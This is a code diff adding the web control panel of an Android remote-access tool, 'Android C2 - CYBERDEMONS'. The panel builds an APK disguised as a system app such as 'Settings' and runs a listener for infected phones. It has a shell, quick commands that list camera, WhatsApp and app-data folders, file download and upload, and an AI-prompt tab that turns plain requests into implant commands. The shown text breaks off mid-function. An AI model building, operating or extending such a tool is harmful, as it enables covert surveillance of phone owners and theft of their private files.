@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#0a0a0f">
+<title>Android C2 - CYBERDEMONS</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root{
+  --cyan:#00fff0;--magenta:#ff00ff;--green:#39ff14;
+  --red:#ff0040;--bg:#05050a;--surface:rgba(8,8,20,0.85);
+  --card:rgba(12,12,30,0.9);--border:rgba(0,255,240,0.12);
+  --border-h:rgba(0,255,240,0.35);--dim:#5a5a7a;--bright:#d0d0ff;
+  --orange:#ff8c00;--yellow:#ffe600;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  font-family:'JetBrains Mono','Share Tech Mono',monospace;
+  background:var(--bg);color:var(--bright);
+  min-height:100vh;position:relative;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;
+  background:linear-gradient(rgba(0,255,240,0.015) 1px,transparent 1px),
+              linear-gradient(90deg,rgba(0,255,240,0.015) 1px,transparent 1px);
+  background-size:50px 50px;pointer-events:none;
+}
+body::after{
+  content:'';position:fixed;inset:0;z-index:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);
+  pointer-events:none;animation:scanlines 8s linear infinite;
+}
+@keyframes scanlines{0%{transform:translateY(0);}100%{transform:translateY(4px);}}
+body.has-bg::before{display:none;}
+body.has-bg::after{opacity:0.5;}
+
+/* === TOP BAR === */
+.topbar{
+  padding:10px 20px;background:var(--surface);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:12px;
+  position:sticky;top:0;z-index:10;
+  backdrop-filter:blur(20px);
+}
+.topbar::after{
+  content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),var(--magenta),var(--cyan),transparent);
+  opacity:0.4;
+}
+.topbar-logo{
+  width:30px;height:30px;border:1px solid var(--cyan);
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;color:var(--cyan);flex-shrink:0;
+  clip-path:polygon(15% 0%,100% 0%,85% 100%,0% 100%);
+  background:rgba(0,255,240,0.05);overflow:hidden;
+}
+.topbar-logo img{width:100%;height:100%;object-fit:cover;}
+.topbar-title{
+  font-family:'Orbitron',monospace;font-size:15px;font-weight:900;
+  color:var(--cyan);letter-spacing:3px;
+}
+.topbar-title span{color:var(--magenta);}
+.topbar-title small{
+  font-size:9px;color:var(--dim);font-family:'JetBrains Mono',monospace;
+  letter-spacing:0;margin-left:8px;
+}
+.topbar-back{
+  margin-left:auto;text-decoration:none;font-size:10px;
+  padding:6px 14px;border-radius:4px;font-weight:700;
+  color:var(--dim);border:1px solid var(--border);
+  font-family:'JetBrains Mono',monospace;text-transform:uppercase;
+  letter-spacing:1px;transition:all .2s;
+}
+.topbar-back:hover{color:var(--cyan);border-color:rgba(0,255,240,0.3);background:rgba(0,255,240,0.05);}
+
+/* === DESKTOP SPLIT LAYOUT === */
+.split{
+  display:grid;grid-template-columns:1fr 1.5fr;gap:16px;
+  padding:20px;position:relative;z-index:1;
+  max-width:1300px;margin:0 auto;
+}
+@media(max-width:900px){.split{grid-template-columns:1fr;}}
+
+/* === CYBER CARD === */
+.cc{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;padding:20px;margin-bottom:16px;
+  position:relative;overflow:hidden;
+  backdrop-filter:blur(10px);
+  transition:border-color .3s,box-shadow .3s;
+}
+.cc:hover{border-color:var(--border-h);box-shadow:0 0 20px rgba(0,255,240,0.06);}
+.cc::before,.cc::after{
+  content:'';position:absolute;width:12px;height:12px;
+  border-color:var(--cyan);border-style:solid;opacity:0.3;
+  transition:opacity .3s;
+}
+.cc::before{top:-1px;left:-1px;border-width:1px 0 0 1px;}
+.cc::after{bottom:-1px;right:-1px;border-width:0 1px 1px 0;}
+.cc:hover::before,.cc:hover::after{opacity:0.7;}
+.cc .glow-line{
+  position:absolute;top:0;left:25%;right:25%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);
+  opacity:0.3;
+}
+.cc-title{
+  font-family:'Orbitron',monospace;font-size:9px;
+  text-transform:uppercase;letter-spacing:2px;color:var(--dim);
+  margin-bottom:16px;display:flex;align-items:center;gap:6px;
+}
+.cc-title .accent{color:var(--cyan);}
+
+/* === FORM === */
+.fg{margin-bottom:14px;}
+.fg label{
+  display:block;font-size:9px;text-transform:uppercase;
+  letter-spacing:1.5px;color:var(--dim);margin-bottom:6px;
+}
+.fg input,.fg select{
+  width:100%;background:rgba(0,0,0,0.5);
+  border:1px solid var(--border);border-radius:4px;
+  padding:11px 14px;color:var(--bright);
+  font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;
+  transition:all .2s;
+}
+.fg input:focus,.fg select:focus{
+  border-color:var(--cyan);box-shadow:0 0 10px rgba(0,255,240,0.1);
+}
+.fg .hint{font-size:9px;color:var(--dim);margin-top:6px;}
+.fg .hint strong{color:var(--cyan);}
+.fr{display:flex;gap:10px;}
+.fr .fg{flex:1;}
+
+/* === BUTTONS === */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  padding:11px 18px;border-radius:4px;border:none;
+  color:var(--bright);font-family:'JetBrains Mono',monospace;
+  font-size:10px;cursor:pointer;transition:all .2s;
+  text-decoration:none;gap:4px;font-weight:700;
+  text-transform:uppercase;letter-spacing:1px;
+  position:relative;overflow:hidden;
+}
+.btn::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,0.05),transparent);
+  opacity:0;transition:opacity .2s;
+}
+.btn:hover::before{opacity:1;}
+.btn:active{transform:scale(0.97);}
+.btn-c{background:rgba(0,255,240,0.12);color:var(--cyan);border:1px solid rgba(0,255,240,0.3);}
+.btn-c:hover{background:rgba(0,255,240,0.2);box-shadow:0 0 15px rgba(0,255,240,0.3);}
+.btn-g{background:rgba(57,255,20,0.12);color:var(--green);border:1px solid rgba(57,255,20,0.3);}
+.btn-g:hover{background:rgba(57,255,20,0.2);box-shadow:0 0 15px rgba(57,255,20,0.3);}
+.btn-r{background:rgba(255,0,64,0.12);color:var(--red);border:1px solid rgba(255,0,64,0.3);}
+.btn-r:hover{background:rgba(255,0,64,0.2);box-shadow:0 0 15px rgba(255,0,64,0.3);}
+.btn-o{background:rgba(255,140,0,0.12);color:var(--orange);border:1px solid rgba(255,140,0,0.3);}
+.btn-o:hover{background:rgba(255,140,0,0.2);box-shadow:0 0 15px rgba(255,140,0,0.3);}
+.btn-p{background:rgba(255,0,255,0.12);color:var(--magenta);border:1px solid rgba(255,0,255,0.3);}
+.btn-p:hover{background:rgba(255,0,255,0.2);box-shadow:0 0 15px rgba(255,0,255,0.3);}
+.btn-fw{width:100%;justify-content:center;}
+.btn-sm{padding:7px 14px;font-size:9px;}
+.btn:disabled{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}
+
+/* === OUTPUT === */
+.out{
+  background:rgba(0,0,0,0.6);border:1px solid var(--border);
+  border-radius:4px;padding:14px;font-size:11px;line-height:1.6;
+  min-height:60px;max-height:200px;overflow-y:auto;white-space:pre-wrap;
+  word-break:break-all;color:var(--green);margin-top:12px;
+  font-family:'Share Tech Mono',monospace;
+}
+.out::-webkit-scrollbar{width:4px;}
+.out::-webkit-scrollbar-thumb{background:rgba(0,255,240,0.2);border-radius:4px;}
+.out a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(0,255,240,0.3);}
+
+/* === STATUS === */
+.sb{
+  display:flex;align-items:center;gap:8px;margin-top:10px;
+  font-size:10px;color:var(--dim);
+}
+.sb .dot{width:7px;height:7px;border-radius:50%;}
+.sb .dot.idle{background:var(--dim);}
+.sb .dot.run{background:var(--yellow);animation:pl 1s infinite;}
+.sb .dot.ok{background:var(--green);box-shadow:0 0 6px var(--green);}
+.sb .dot.on{background:var(--green);box-shadow:0 0 6px var(--green);}
+.sb .dot.fail{background:var(--red);}
+@keyframes pl{0%,100%{opacity:1;}50%{opacity:0.3;}}
+
+/* === COMMAND PALETTE === */
+.cpal{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px;margin-top:10px;}
+.cpal .cb{
+  padding:10px 6px;border-radius:4px;border:1px solid var(--border);
+  background:rgba(0,0,0,0.3);color:var(--bright);
+  font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
+  cursor:pointer;transition:all .15s;text-align:center;
+  display:flex;flex-direction:column;align-items:center;gap:4px;
+  text-transform:uppercase;letter-spacing:.5px;
+}
+.cpal .cb .ico{font-size:16px;}
+.cpal .cb:active{transform:scale(0.92);}
+.cpal .cb:hover{border-color:var(--cyan);box-shadow:0 0 12px rgba(0,255,240,0.15);background:rgba(0,255,240,0.04);}
+.cpal .cb.danger{border-color:rgba(255,0,64,0.2);}
+.cpal .cb.danger:hover{border-color:var(--red);box-shadow:0 0 12px rgba(255,0,64,0.2);}
+
+/* === TERMINAL === */
+.term{
+  background:rgba(0,0,0,0.6);border:1px solid var(--border);
+  border-radius:4px;padding:12px;min-height:200px;max-height:400px;
+  overflow-y:auto;font-size:11px;line-height:1.6;
+  font-family:'Share Tech Mono',monospace;
+}
+.term::-webkit-scrollbar{width:4px;}
+.term::-webkit-scrollbar-thumb{background:rgba(0,255,240,0.2);border-radius:4px;}
+.term .l{white-space:pre-wrap;word-break:break-all;padding:1px 0;}
+.term .l.c{color:var(--cyan);}
+.term .l.c::before{content:'> ';color:var(--magenta);font-weight:700;}
+.term .l.r{color:var(--bright);}
+.term .l.s{color:var(--dim);font-style:italic;}
+.term .l.e{color:var(--red);}
+.term .l.f{color:var(--orange);}
+.term .l.d{color:var(--green);}
+.tr{display:flex;gap:6px;margin-top:8px;}
+.tr input{
+  flex:1;background:rgba(0,0,0,0.6);border:1px solid var(--border);
+  border-radius:4px;padding:10px 14px;color:var(--bright);
+  font-size:12px;font-family:'Share Tech Mono',monospace;outline:none;
+}
+.tr input:focus{border-color:var(--cyan);box-shadow:0 0 10px rgba(0,255,240,0.1);}
+.tr button{
+  border:1px solid rgba(0,255,240,0.3);border-radius:4px;
+  padding:10px 20px;font-family:'JetBrains Mono',monospace;
+  font-size:10px;cursor:pointer;font-weight:700;
+  background:rgba(0,255,240,0.1);color:var(--cyan);
+  text-transform:uppercase;letter-spacing:1px;transition:all .2s;
+}
+.tr button:hover{background:rgba(0,255,240,0.2);box-shadow:0 0 15px rgba(0,255,240,0.3);}
+.tr button:active{transform:scale(0.97);}
+.tr button:disabled{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}
+
+/* === DEVICE INFO === */
+.dinfo{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px;}
+.dinfo .di{
+  background:rgba(0,0,0,0.3);border:1px solid var(--border);
+  border-radius:4px;padding:8px 10px;
+}
+.dinfo .di .k{font-size:8px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);}
+.dinfo .di .v{font-size:12px;color:var(--cyan);margin-top:2px;}
+
+/* === TABS === */
+.tabs{display:flex;gap:4px;margin-bottom:12px;}
+.tabs .tab{
+  flex:1;padding:8px;text-align:center;font-size:9px;font-weight:700;
+  background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:4px;
+  cursor:pointer;color:var(--dim);transition:all .15s;
+  font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:1px;
+}
+.tabs .tab.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,255,240,0.05);box-shadow:0 0 10px rgba(0,255,240,0.1);}
+.tabcontent{display:none;}
+.tabcontent.active{display:block;}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-logo" id="hdrLogoEl">&#9881;</div>
+  <div class="topbar-title">ANDROID <small>C2 v2.0</small></div>
+  <a href="/" class="topbar-back">&#8592; C2 DASHBOARD</a>
+</div>
+
+<div class="split">
+  <!-- LEFT COLUMN: APK Builder + Listener -->
+  <div>
+    <!-- APK Builder -->
+    <div class="cc">
+      <div class="glow-line"></div>
+      <div class="cc-title"><span class="accent">&#9670;</span> APK Builder</div>
+      <div class="fg">
+        <label>App Name (shown on device)</label>
+        <input type="text" id="aAppName" value="Settings" placeholder="e.g. Chrome Update">
+        <div class="hint">Name displayed under the app icon on the phone</div>
+      </div>
+      <div class="fg">
+        <label>Target URL (opens on launch)</label>
+        <input type="text" id="aUrl" placeholder="https://example.com" value="https://www.google.com">
+        <div class="hint">Website shown in app's WebView when opened</div>
+      </div>
+      <div class="fr">
+        <div class="fg"><label>C2 Host / IP</label><input type="text" id="aHost" placeholder="e.g. 0.tcp.in.ngrok.io"></div>
+        <div class="fg" style="flex:0 0 100px;"><label>Port</label><input type="number" id="aPort" value="8080"></div>
+      </div>
+      <div class="fg">
+        <label>Output Filename</label>
+        <input type="text" id="aFile" value="cyberdemon_c2" placeholder="e.g. myapp">
+        <div class="hint">Output: <strong id="aPrev">cyberdemon_c2.apk</strong></div>
+      </div>
+      <div class="fg">
+        <label>Custom Icon (.png)</label>
+        <input type="file" id="aIcon" accept=".png" style="padding:8px;font-size:12px;">
+        <div class="hint">Optional &mdash; 512x512 recommended</div>
+      </div>
+      <button class="btn btn-c btn-fw" onclick="apkBuild()" id="apkBtn">Build APK</button>
+      <a class="btn btn-g btn-fw" id="apkDl" style="display:none;margin-top:8px;" href="#">&#8595; Download APK</a>
+      <div class="out" id="apkOut">Ready. Configure and build.</div>
+      <div class="sb"><span class="dot idle" id="apkDot"></span><span id="apkStat">Idle</span></div>
+    </div>
+
+    <!-- Listener Controls -->
+    <div class="cc">
+      <div class="glow-line"></div>
+      <div class="cc-title"><span class="accent">&#9670;</span> Android C2 Listener</div>
+      <div style="display:flex;gap:6px;margin-bottom:8px;">
+        <input type="number" id="alPort" value="8080" placeholder="port" class="fg" style="flex:1;margin-bottom:0;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:10px 12px;color:var(--bright);font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;">
+        <button class="btn btn-c btn-sm" id="alStartBtn" onclick="alStart()">Start</button>
+        <button class="btn btn-r btn-sm" id="alStopBtn" onclick="alStop()" style="display:none;">Stop</button>
+      </div>
+      <div class="sb"><span class="dot idle" id="alDot"></span><span id="alStat">Not running</span></div>
+
+      <div id="alClientBar" style="display:none;margin-top:10px;">
+        <div class="fg">
+          <label>Connected Devices</label>
+          <select id="alClientSelect" onchange="alSwitchClient()" style="width:100%;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:10px 12px;color:var(--bright);font-size:12px;font-family:'JetBrains Mono',monospace;outline:none;"></select>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT COLUMN: Tabs (Terminal / Commands / Files) -->
+  <div>
+    <div id="alTabs" style="display:none;">
+      <div class="tabs">
+        <div class="tab active" onclick="alTab('terminal')">Terminal</div>
+        <div class="tab" onclick="alTab('ai')">AI Prompt</div>
+        <div class="tab" onclick="alTab('commands')">Commands</div>
+        <div class="tab" onclick="alTab('files')">Files</div>
+      </div>
+
+      <div class="tabcontent" id="alTabAi">
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title" style="justify-content:space-between;">
+            <span><span class="accent">&#9670;</span> AI Prompt</span>
+            <span id="alaic" style="color:var(--dim);font-size:9px;">checking...</span>
+          </div>
+          <div style="font-size:10px;color:var(--dim);padding:0 2px 8px;">
+            Describe what you want in plain language. The local opencode model
+            turns it into a single Android command &mdash; you approve it before
+            anything runs. Shell work is sent as <code>SHELL:...</code>, which is
+            what the implant expects; a bare command is rejected as an unknown verb.
+          </div>
+          <div class="term" id="alAiLog" style="min-height:220px;"></div>
+          <div class="tr">
+            <input type="text" id="alAiIn" placeholder="Enter to plan, then Enter again to run &mdash; e.g. what is stored on the sdcard?" disabled>
+            <button id="alAiGo" disabled onclick="alAiPlan()">PLAN</button>
+          </div>
+          <div style="font-size:9px;color:var(--dim);margin-top:6px;">
+            <strong>Enter</strong> proposes a command &middot; <strong>Enter</strong> again runs it
+            &middot; <strong>Esc</strong> cancels
+          </div>
+          <div id="alAiApprove" style="display:none;margin-top:8px;padding:10px;
+               border:1px solid var(--green);border-radius:6px;background:rgba(0,255,150,.06);">
+            <div style="font-size:9px;color:var(--green);letter-spacing:1px;margin-bottom:6px;">PROPOSED COMMAND &mdash; REVIEW BEFORE RUNNING</div>
+            <code id="alAiCmd" style="display:block;font-family:'JetBrains Mono',monospace;
+                  font-size:12px;color:var(--green);word-break:break-all;margin-bottom:8px;"></code>
+            <div style="display:flex;gap:6px;">
+              <button class="btn btn-c btn-sm" style="flex:1;" onclick="alAiRun()">RUN IT</button>
+              <button class="btn btn-sm" style="flex:1;" onclick="alAiCancel()">CANCEL</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tabcontent active" id="alTabTerminal">
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Interactive Shell</div>
+          <div class="term" id="alTerm"></div>
+          <div class="tr" id="alCmdRow">
+            <input type="text" id="alCmd" placeholder="shell command or CMD:arg...">
+            <button onclick="alSend()">Send</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="tabcontent" id="alTabCommands">
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Quick Commands</div>
+          <div class="cpal">
+            <button class="cb" onclick="alCmd('SHELL:id')"><span class="ico">&#128100;</span>whoami</button>
+            <button class="cb" onclick="alCmd('SHELL:uname -a')"><span class="ico">&#128187;</span>System Info</button>
+            <button class="cb" onclick="alCmd('SHELL:ip addr')"><span class="ico">&#128246;</span>IP Address</button>
+            <button class="cb" onclick="alCmd('SHELL:ip route')"><span class="ico">&#128225;</span>Routes</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /sdcard/')"><span class="ico">&#128193;</span>List /sdcard</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /sdcard/DCIM/')"><span class="ico">&#128194;</span>List DCIM</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /sdcard/Download/')"><span class="ico">&#128195;</span>List Downloads</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /data/data/')"><span class="ico">&#128274;</span>List Apps</button>
+            <button class="cb danger" onclick="alCmd('SHELL:ls -la /')"><span class="ico">&#128193;</span>List Root</button>
+            <button class="cb" onclick="alCmd('SHELL:cat /proc/version')"><span class="ico">&#128196;</span>Kernel</button>
+            <button class="cb" onclick="alCmd('SHELL:df -h')"><span class="ico">&#128190;</span>Disk Usage</button>
+            <button class="cb" onclick="alCmd('SHELL:free -m')"><span class="ico">&#128187;</span>Memory</button>
+            <button class="cb" onclick="alCmd('SHELL:ps -A')"><span class="ico">&#9881;</span>Processes</button>
+            <button class="cb" onclick="alCmd('SHELL:cat /proc/net/tcp')"><span class="ico">&#128225;</span>Connections</button>
+            <button class="cb" onclick="alCmd('SHELL:ping -c 1 8.8.8.8')"><span class="ico">&#128267;</span>Ping</button>
+            <button class="cb" onclick="alCmd('SHELL:getprop ro.product.model')"><span class="ico">&#128241;</span>Device Model</button>
+            <button class="cb" onclick="alCmd('SHELL:getprop ro.build.version.release')"><span class="ico">&#128187;</span>Android Ver</button>
+            <button class="cb" onclick="alCmd('SHELL:settings get secure android_id')"><span class="ico">&#128273;</span>Android ID</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /storage/emulated/0/')"><span class="ico">&#128193;</span>Storage Root</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /storage/emulated/0/DCIM/')"><span class="ico">&#128247;</span>Camera</button>
+            <button class="cb" onclick="alCmd('SHELL:ls -la /storage/emulated/0/WhatsApp/')"><span class="ico">&#128172;</span>WhatsApp</button>
+            <button class="cb" onclick="alCustomCmd()"><span class="ico">&#9881;</span>Custom CMD</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="tabcontent" id="alTabFiles">
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> File Browser</div>
+          <div class="fg">
+            <label>Device Path</label>
+            <input type="text" id="alBrowsePath" value="/storage/emulated/0/" placeholder="/storage/emulated/0/">
+          </div>
+          <div style="display:flex;gap:6px;">
+            <button class="btn btn-sm btn-c" onclick="alBrowse()">Browse</button>
+            <button class="btn btn-sm btn-c" onclick="alLoadDownloaded()">Downloaded Files</button>
+            <button class="btn btn-sm btn-o" onclick="alLoadDownloaded()">Refresh</button>
+          </div>
+          <div class="term" id="alFileList" style="max-height:200px;margin-top:10px;"></div>
+        </div>
+
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Download From Device</div>
+          <div class="fg">
+            <label>Device Path</label>
+            <input type="text" id="alDownPath" placeholder="/storage/emulated/0/somefile.txt">
+          </div>
+          <button class="btn btn-o btn-fw" onclick="alDownload()">Download</button>
+        </div>
+
+        <div class="cc">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Upload To Device</div>
+          <div class="fg">
+            <label>File</label>
+            <input type="file" id="alUploadFile" style="padding:8px;font-size:12px;">
+          </div>
+          <div class="fg">
+            <label>Destination Path</label>
+            <input type="text" id="alUpPath" placeholder="/storage/emulated/0/ (optional)">
+          </div>
+          <button class="btn btn-p btn-fw" onclick="alUpload()">Upload to Device</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Placeholder when listener not started -->
+    <div id="alPlaceholder">
+      <div class="cc" style="text-align:center;padding:60px 20px;">
+        <div class="glow-line"></div>
+        <div style="font-size:48px;opacity:0.15;margin-bottom:12px;">&#128241;</div>
+        <div style="font-family:'Orbitron',monospace;font-size:11px;color:var(--dim);letter-spacing:2px;text-transform:uppercase;">
+          Start Android Listener to Begin
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+async function api(url,opts){try{const r=await fetch(url,opts);return await r.json()}catch{return null}}
+
+(async()=>{
+  const ng=await api('/api/ngrok/status');
+  if(ng&&ng.running&&ng.host){document.getElementById('aHost').value=ng.host;document.getElementById('aPort').value=ng.port;}
+})();
+
+document.getElementById('aFile').addEventListener('input',function(){
+  document.getElementById('aPrev').textContent=(this.value.trim()||'cyberdemon_c2')+'.apk';
+});
+
+// APK Build
+let apkPoll=null;
+async function apkBuild(){
+  const h=document.getElementById('aHost').value.trim(),p=document.getElementById('aPort').value;
+  const url=document.getElementById('aUrl').value.trim()||'https://www.google.com';
+  const appName=document.getElementById('aAppName').value.trim()||'Settings';
+  const f=document.getElementById('aFile').value.trim()||'cyberdemon_c2';
+  const icon=document.getElementById('aIcon').files[0];
+  const btn=document.getElementById('apkBtn');btn.disabled=true;btn.textContent='Building...';
+  document.getElementById('apkDl').style.display='none';
+  document.getElementById('apkOut').textContent='Building APK...';
+  let r;
+  if(icon){
+    const fd=new FormData();
+    fd.append('c2_host',h);fd.append('c2_port',p);fd.append('target_url',url);
+    fd.append('app_name',appName);fd.append('apk_name',f);fd.append('icon',icon);
+    r=await api('/api/apk/build',{method:'POST',body:fd});
+  }else{
+    r=await api('/api/apk/build',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({c2_host:h,c2_port:parseInt(p),target_url:url,app_name:appName,apk_name:f})});
+  }
+  if(r&&r.error){document.getElementById('apkOut').textContent=r.error;btn.disabled=false;btn.textContent='Build APK';return;}
+  apkPoll=setInterval(async()=>{
+    const s=await api('/api/apk/status');if(!s)return;
+    if(s.running){document.getElementById('apkOut').textContent='Compiling...';return;}
+    clearInterval(apkPoll);apkPoll=null;btn.disabled=false;btn.textContent='Build APK';
+    if(s.success){
+      document.getElementById('apkDot').className='dot ok';document.getElementById('apkStat').textContent='Build OK';
+      document.getElementById('apkOut').innerHTML='Build succeeded. <a href="/api/apk/download">Download '+(s.apk_name||'APK')+'</a>';
+      document.getElementById('apkDl').style.display='flex';document.getElementById('apkDl').href='/api/apk/download';
+    }else{
+      document.getElementById('apkDot').className='dot fail';document.getElementById('apkStat').textContent='Build failed';
+      document.getElementById('apkOut').textContent=s.last_output||'Error';
+    }
+  },1000);
+}
+
+// Android Listener
+let alPoll=null,alOutIdx=0,alClientId='';
+async function alStart(){
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  const r=await api('/api/android-listener/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p})});
+  if(r&&r.error){document.getElementById('alStat').textContent='Error: '+r.error;return;}
+  document.getElementById('alStartBtn').style.display='none';document.getElementById('alStopBtn').style.display='inline';
+  document.getElementById('alTabs').style.display='block';
+  document.getElementById('alPlaceholder').style.display='none';
+  alOutIdx=0;alClientId='';alPoll=setInterval(alPollStatus,1500);alPollStatus();
+}
+async function alStop(){
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  await api('/api/android-listener/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p})});
+  if(alPoll){clearInterval(alPoll);alPoll=null;}
+  document.getElementById('alStartBtn').style.display='inline';document.getElementById('alStopBtn').style.display='none';
+  document.getElementById('alTabs').style.display='none';document.getElementById('alClientBar').style.display='none';
+  document.getElementById('alPlaceholder').style.display='block';
+  document.getElementById('alDot').className='dot idle';document.getElementById('alStat').textContent='Not running';
+}
+async function alPollStatus(){
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  const s=await api('/api/android-listener/status?port='+p);
+  if(!s)return;
+  const dot=document.getElementById('alDot'),st=document.getElementById('alStat');
+  if(!s.running){dot.className='dot idle';st.textContent='Not running';return;}
+  if(s.client_count>0){
+    dot.className='dot on';st.textContent=s.client_count+' device(s) connected';
+    document.getElementById('alClientBar').style.display='block';
+    const sel=document.getElementById('alClientSelect');
+    const prevVal=alClientId;
+    let html='';
+    for(const c of s.clients){html+='<option value="'+c.id+'">'+c.addr+' ('+c.id+')</option>';}
+    sel.innerHTML=html;
+    if(prevVal&&sel.querySelector('option[value="'+prevVal+'"]')){
+      sel.value=prevVal;
+    }else if(s.clients.length>0){
+      alClientId=s.clients[0].id;
+      sel.value=alClientId;
+    }
+    alAiEnable();
+  }else if(s.ready){
+    dot.className='dot run';st.textContent='Listening on '+s.port+'...';
+    document.getElementById('alClientBar').style.display='none';
+  }else{
+    dot.className='dot run';st.textContent='Starting...';
+  }
+  const o=await api('/api/android-listener/output?port='+p+'&since='+alOutIdx);
+  if(o&&o.output){
+    const el=document.getElementById('alTerm');
+    for(const item of o.output){
+      const div=document.createElement('div');
+      if(item.type==='system'){div.className='l s';div.textContent=item.data;}
+      else if(item.type==='cmd'){div.className='l c';div.textContent=item.data;}
+      else if(item.type==='error'){div.className='l e';div.textContent=item.data;}
+      else if(item.type==='file'){div.className='l f';div.textContent=item.data+' [Files tab]';}
+      else{div.className='l r';div.textContent=item.data;}
+      el.appendChild(div);
+    }
+    alOutIdx=o.count;el.scrollTop=el.scrollHeight;
+  }
+}
+function alSwitchClient(){alClientId=document.getElementById('alClientSelect').value;alAiEnable();}
+function alGetClientId(){return alClientId;}
+
+async function alSend(){
+  const i=document.getElementById('alCmd'),c=i.value.trim();if(!c)return;i.value='';
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  await api('/api/android-listener/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p,text:c,client_id:alGetClientId()})});
+  const el=document.getElementById('alTerm');
+  const div=document.createElement('div');div.className='l c';div.textContent=c;el.appendChild(div);el.scrollTop=el.scrollHeight;
+}
+document.getElementById('alCmd').addEventListener('keydown',e=>{if(e.key==='Enter')alSend();});
+
+async function alCmd(cmd){
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  await api('/api/android-listener/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p,text:cmd,client_id:alGetClientId()})});
+  const el=document.getElementById('alTerm');
+  const div=document.createElement('div');div.className='l c';div.textContent=cmd;el.appendChild(div);el.scrollTop=el.scrollHeight;
+}
+function alCustomCmd(){const cmd=prompt('Enter shell command:');if(cmd)alCmd(cmd);}
+
+async function alBrowse(){
+  const path=document.getElementById('alBrowsePath').value.trim()||'/storage/emulated/0/';
+  alCmd('ls -la '+path);
+}
+async function alLoadDownloaded(){
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  const cid=alGetClientId();
+  const files=await api('/api/android-listener/files?port='+p+'&client_id='+cid);
+  const el=document.getElementById('alFileList');
+  if(!cid){el.innerHTML='<div class="l s">Select a device first.</div>';return;}
+  if(!files||!files.files||files.files.length===0){el.innerHTML='<div class="l s">No downloaded files for '+cid+'</div>';return;}
+  let html='<div class="l s" style="margin-bottom:6px;">Client: '+cid+' ('+files.files.length+' files)</div>';
+  for(const f of files.files){
+    const sz=f.size>1048576?(f.size/1048576).toFixed(1)+'MB':f.size>1024?(f.size/1024).toFixed(1)+'KB':f.size+'B';
+    const dlUrl='/files/android_clients/'+encodeURIComponent(cid)+'/'+encodeURIComponent(f.name);
+    html+='<div class="l d" style="display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid rgba(0,255,240,0.1);">';
+    html+='<span>'+f.name+' ('+sz+')</span>';
+    html+='<a href="'+dlUrl+'" download class="btn btn-sm btn-c" style="text-decoration:none;padding:4px 10px;font-size:9px;">Download</a>';
+    html+='</div>';
+  }
+  el.innerHTML=html;
+}
+async function alDownload(){
+  const path=document.getElementById('alDownPath').value.trim();
+  if(!path){alert('Enter file path');return;}
+  const p=parseInt(document.getElementById('alPort').value)||8080;
